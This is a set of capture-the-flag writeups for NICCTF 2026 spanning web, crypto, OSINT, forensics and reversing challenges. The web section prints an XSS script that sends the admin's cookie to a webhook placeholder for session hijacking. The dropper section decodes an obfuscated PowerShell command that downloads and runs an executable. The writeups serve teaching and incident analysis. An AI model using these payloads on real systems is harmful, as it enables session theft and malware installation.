# NICCTF 2026 Writeups

A comprehensive collection of writeups for challenges from NICCTF 2026.

## Table of Contents

- [Web](#web)
  - [Need to Know Basis?](#need-to-know-basis)
- [Misc](#misc)
  - [Word On The Street](#word-on-the-street)
- [Cryptography](#cryptography)
  - [e8-2-zit](#e8-2-zit)
- [OSINT](#osint)
  - [Cockpit Climb](#cockpit-climb)
  - [Finding The Beagle](#finding-the-beagle)
  - [Bruhh!! It's CHISHIYA](#bruhh-its-chishiya)
- [Forensics](#forensics)
  - [Wierd Sentence](#wierd-sentence)
  - [E B S](#e-b-s)
  - [Industrial Echoes](#industrial-echoes)
  - [SUS Staging Dropper](#sus-staging-dropper)
- [Reversing](#reversing)
  - [KeyedUp](#keyedup)

---

## Web

### Need to Know Basis?

**Difficulty:** Medium  
**Flag:** `NICCTF26{533M5_l1k3_17_W4snt_50_p3r50n41_251e}`

#### Challenge Description
This challenge involves an EJS-based web application with "Magic Links" and "Draft Notes" functionality.

#### Solution

The vulnerability lies in the ability to inject XSS through draft notes and share them via magic links with an admin user.

##### Steps:

1. **Create a draft note with XSS payload:**
   ```javascript
   <script>
   fetch('https://webhook.site/YOUR_WEBHOOK_ID?cookie=' + document.cookie);
   </script>
   ```

2. **Generate a magic link** for the draft note

3. **Share the magic link** with the admin (simulated in the challenge)

4. **Admin clicks the link**, executing the XSS payload

5. **The payload leaks** the `sid_prev` session cookie to your webhook

6. **Use the stolen session cookie** to impersonate the admin

7. **Access the `/flag` endpoint** to retrieve the flag

#### Key Concepts
- Cross-Site Scripting (XSS)
- Session Hijacking
- EJS Template Engine
- Magic Links Authentication

#### Tags
`XSS` `Session Hijacking` `EJS` `Magic Links` `Web Security`

---

## Misc

### Word On The Street

**Difficulty:** Easy  
**Flag:** `NICCTF26{MIMOSA}`

#### Challenge Description
The challenge provides a seemingly random string of characters that needs to be decoded.

#### Solution

The solution involves mapping the "trail" of characters on a QWERTY keyboard layout. 

##### Steps:

1. **Analyze the character string** provided in the challenge

2. **Map each character** to its position on a QWERTY keyboard

3. **Trace the movement pattern** between consecutive characters

4. **The movement patterns** spell out a word when visualized on the keyboard

5. **The word revealed is:** MIMOSA

#### Key Concepts
- Keyboard Pattern Recognition
- Visual Cryptography
- QWERTY Layout Analysis

#### Tags
`Keyboard` `Pattern Recognition` `Misc` `Cryptography`

---

## Cryptography

### e8-2-zit

**Difficulty:** Easy  
**Flag:** `NICCTF26{b4$hful_iz_my_TOP_TIER_dw4rf_buddy_XD}`

#### Challenge Description
A classical cryptography challenge with an encrypted ciphertext and a hint.

**Ciphertext:**
```
y4$sufo_ra_nb_GLK_GRVI_wd4iu_yfwwb_CW
```

**Hint:** `e8 -2- zit`

#### Solution

Despite the hint suggesting other ciphers, the correct solution uses the **Atbash cipher**.

##### Analysis:

1. **Ciphertext characteristics:**
   - Preserves case (uppercase/lowercase)
   - Preserves numbers and special characters
   - Underscores suggest word boundaries
   - Indicates a classical substitution cipher

2. **Initial attempts:**
   - Caesar cipher - no readable output
   - Vigenère with key "zit" - no readable output
   - Various combinations - unsuccessful

3. **Atbash cipher:**
   - Simple substitution: `a ↔ z`, `b ↔ y`, `c ↔ x`, etc.
   - Works for both uppercase and lowercase
   - Non-alphabetic characters remain unchanged

##### Decryption Process:

```python
def atbash(text):
    result = ""
    for char in text:
        if char.isalpha():
            if char.isupper():
                result += chr(ord('Z') - (ord(char) - ord('A')))
            else:
                result += chr(ord('z') - (ord(char) - ord('a')))
        else:
            result += char
    return result

ciphertext = "y4$sufo_ra_nb_GLK_GRVI_wd4iu_yfwwb_CW"
plaintext = atbash(ciphertext)
print(plaintext)
```

**Output:** `b4$hful_iz_my_TOP_TIER_dw4rf_buddy_XD`

The result is readable English with intentional leetspeak styling.

#### Key Concepts
- Classical Cryptography
- Atbash Cipher
- Substitution Ciphers
- Cipher Identification
- Leetspeak

#### Tags
`Cryptography` `Atbash` `Classical Cipher` `Substitution` `Leetspeak`

---

## OSINT

### Cockpit Climb

**Difficulty:** Easy  
**Flag:** `NICCTF26{F-104_Starfighter}`

#### Challenge Description
This OSINT challenge requires identifying an aircraft from a cockpit image.

#### Solution

##### Steps:

1. **Analyze the cockpit image** for distinctive features

2. **Identify visual markers** that might indicate the museum or location

3. **Research reveals** the location is the Palm Springs Air Museum

4. **Browse the museum's exhibits** to find matching aircraft

5. **The aircraft is identified as:** F-104 Starfighter

#### Key Concepts
- Image Analysis
- Museum Research
- Aircraft Identification
- OSINT Techniques

#### Tags
`OSINT` `Aircraft` `Museum` `Image Analysis`

---

### Finding The Beagle

**Difficulty:** Easy  
**Flag:** `NICCTF26{7668669112}`

#### Challenge Description
The challenge involves finding a specific pet shop near a landmark shown in an image.

#### Solution

##### Steps:

1. **Identify the landmark** in the image: Clock Tower in Dehradun

2. **Search for pet shops** near the Clock Tower

3. **The shop is identified as:** "Dehradunpetdogs"

4. **Find the contact information** for the shop

5. **The flag is their phone number:** 7668669112

#### Key Concepts
- Landmark Identification
- Geolocation
- Business Research
- Contact Information Gathering

#### Tags
`OSINT` `Geolocation` `Business Intelligence` `Phone Number`

---

### Bruhh!! It's CHISHIYA

**Difficulty:** Easy  
**Flag:** `NICCTF26{but_1m_cl3v3r}`

#### Challenge Description
A social media OSINT challenge where the player must find a specific Instagram profile.

#### Solution

##### Steps:

1. **Search for the Instagram username:** `shuntaro_.chishiya_`

2. **Navigate to the profile** and view the posts

3. **Examine the most recent post** for hidden information

4. **The flag is hidden** within the image content of the post

5. **Extract the flag:** `NICCTF26{but_1m_cl3v3r}`

#### Key Concepts
- Social Media Investigation
- Instagram OSINT
- Image Analysis
- Profile Research

#### Tags
`OSINT` `Instagram` `Social Media` `Image Analysis`

---

## Forensics

### Wierd Sentence

**Difficulty:** Easy  
**Flag:** `NICCTF26{AI_Can_See_Much_More}`

#### Challenge Description
This writeup demonstrates Unicode steganography using zero-width characters.

#### Solution

A seemingly normal sentence contains hidden zero-width characters (Invisible Ink).

##### Steps:

1. **Analyze the provided sentence** for anomalies

2. **Recognize the presence** of zero-width characters

3. **Use a Unicode steganography decoder** or script to extract hidden characters

4. **Common tools:**
   - Online Unicode steganography decoders
   - Python scripts with Unicode analysis
   - Browser developer tools

5. **Extract the non-printing characters** to reveal the flag

#### Key Concepts
- Unicode Steganography
- Zero-Width Characters
- Invisible Ink Technique
- Text Analysis

#### Tags
`Forensics` `Steganography` `Unicode` `Zero-Width Characters`

---

### E B S

**Difficulty:** Medium  
**Flag:** `NICCTF26{ECHO35_4R3_LOUDER_WH3N_PIX3LS_SPE4K}`

#### Challenge Description
A multi-layered steganography challenge involving both image and audio files.

#### Solution

This challenge requires two steganography tools: `zsteg` and `steghide`.

##### Steps:

1. **Run zsteg on the image file:**
   ```bash
   zsteg image.png
   ```

2. **Find the hidden password:** `Xy@7K8*L9#mP`

3. **Use steghide to extract from the audio file:**
   ```bash
   steghide extract -sf audio.wav -p "Xy@7K8*L9#mP"
   ```

4. **Extract the hidden file** containing the flag

5. **Read the extracted file** to get the flag

#### Tools Used
- `zsteg` - For LSB steganography in images
- `steghide` - For steganography in audio/image files

#### Key Concepts
- Multi-Layer Steganography
- LSB (Least Significant Bit) Analysis
- Password-Protected Steganography
- Audio Steganography

#### Tags
`Forensics` `Steganography` `zsteg` `steghide` `Audio` `Image`

---

### Industrial Echoes

**Difficulty:** Medium  
**Flag:** `NICCTF26{modbus_data_extraction_is_fun}`

#### Challenge Description
This challenge involves analyzing network traffic capture of industrial Modbus communication.

#### Solution

##### Steps:

1. **Open the PCAP file** in Wireshark or similar tool

2. **Filter for Modbus traffic:**
   ```
   modbus
   ```

3. **Navigate to the 17th packet** in the capture

4. **Examine the TCP layer** of the packet

5. **Extract the hexadecimal payload** from the TCP data

6. **Convert the hex to ASCII** to reveal the flag

#### Example Analysis:
```python
# Python script to extract and decode
import binascii

hex_payload = "4E49434354463236..."  # From packet 17
flag = binascii.unhexlify(hex_payload).decode('ascii')
print(flag)
```

#### Key Concepts
- Network Traffic Analysis
- Modbus Protocol
- PCAP Analysis
- Industrial Control Systems (ICS)
- Hex to ASCII Conversion

#### Tags
`Forensics` `Network Analysis` `Modbus` `PCAP` `ICS` `Wireshark`

---

### SUS Staging Dropper

**Difficulty:** Easy  
**Flag:** `NICCTF26{4b8f4b0b0e4e4f4e4b8f4b0b0e4e4f4e}`

#### Challenge Description
During the investigation of a compromised workstation, a single PowerShell command was discovered. The task is to determine what the command does and where it retrieves its payload from.

**PowerShell Command:**
```powershell
C:\Windows\System32\WindowsPowershell\v3.1\powershell.exe -noP -sta -w 1 -enc TmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwOi8vTklDQ1RGMjZ7NGI4ZjRiMGIwZTRlNGY0ZTRiOGY0YjBiMGU0ZTRmNGV9L19ldmlsLmV4ZScsJ2V2aWwuZXhlJyk7U3RhcnQtUHJvY2VzcyAnZXZpbC5leGUn
```

#### Solution

This is a classic PowerShell obfuscation technique used by malware to hide malicious commands.

##### Step 1: Identifying the Obfuscation

The PowerShell command uses the `-enc` flag, indicating that the payload is **Base64-encoded**.

PowerShell expects Base64 content to be encoded in **UTF-16LE**, so decoding must be done accordingly.

##### Step 2: Decoding the Payload

Using Python to decode the Base64 string:

```python
import base64

encoded = "TmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwOi8vTklDQ1RGMjZ7NGI4ZjRiMGIwZTRlNGY0ZTRiOGY0YjBiMGU0ZTRmNGV9L19ldmlsLmV4ZScsJ2V2aWwuZXhlJyk7U3RhcnQtUHJvY2VzcyAnZXZpbC5leGUn"

# Decode from Base64
decoded = base64.b64decode(encoded).decode('utf-16le')
print(decoded)
```

**Decoded Output:**
```powershell
(New-Object System.Net.WebClient).DownloadFile('http://NICCTF26{4b8f4b0b0e4e4f4e4b8f4b0b0e4e4f4e}/_evil.exe','evil.exe');Start-Process 'evil.exe'
```

##### Step 3: Analyzing the Behavior

The decoded PowerShell command performs the following actions:

1. **Creates a `System.Net.WebClient` object** to download files from the internet
2. **Downloads a file named `_evil.exe`** from a remote HTTP server
3. **Saves it locally as `evil.exe`**
4. **Executes the downloaded binary immediately** using `Start-Process`

This is a **classic staging dropper** commonly seen in malware infections, designed to fetch and execute a secondary payload with minimal footprint.

##### Step 4: Locating the Flag

The flag is embedded directly inside the URL used to download the payload:

```
http://NICCTF26{4b8f4b0b0e4e4f4e4b8f4b0b0e4e4f4e}/_evil.exe
```

#### Final Answer

**What the command does:**  
Downloads a malicious executable from a remote server and executes it on the compromised machine.

**Payload source:**  
A remote HTTP server hosting `_evil.exe`.

#### Key Concepts
- PowerShell Obfuscation
- Base64 Encoding/Decoding
- UTF-16LE Encoding
- Malware Analysis
- Staging Droppers
- Living-off-the-Land Binaries (LOLBins)
- Incident Response

#### Tags
`Forensics` `PowerShell` `Malware Analysis` `Base64` `Obfuscation` `Incident Response` `Dropper`

---

## Reversing

### KeyedUp

**Difficulty:** Easy  
**Flag:** `NICCTF26{Z25pa19lc3JldmVyX2Npbg==}`

#### Challenge Description
A binary reversing challenge where a program checks for a valid license key.

#### Solution

##### Steps:

1. **Analyze the binary** using a decompiler (Ghidra, IDA, or Binary Ninja)

2. **Identify the key validation logic:**
   ```c
   output[i] = (i + 0x42) ^ input[i]
   ```

3. **Reverse the XOR operation** to find the valid key:
   ```python
   # Known output or expected behavior
   key = ""
   for i in range(len(expected)):
       key += chr((i + 0x42) ^ expected[i])
   ```

4. **The key is revealed:** `nic_reverse_king`

5. **Reverse the string:** `gnik_esrever_cin`

6. **Encode in Base64** to get the flag:
   ```python
   import base64
   flag = base64.b64encode(b"gnik_esrever_cin").decode()
   print(f"NICCTF26{{{flag}}}")
   ```

#### Tools Used
- Ghidra / IDA Pro / Binary Ninja
- Python for XOR reversal and Base64 encoding

#### Key Concepts
- Binary Reverse Engineering
- XOR Cipher Analysis
- Base64 Encoding
- License Key Validation

#### Tags
`Reversing` `XOR` `Base64` `Binary Analysis` `Decompilation`

---

## Contributors

- **Author:** H4ck3rKing
- **CTF:** NICCTF 2026
- **Date:** January 2026

## License

These writeups are provided for educational purposes. Please respect the CTF organizers and don't share flags during active competitions.

---

**Happy Hacking! 🚀**
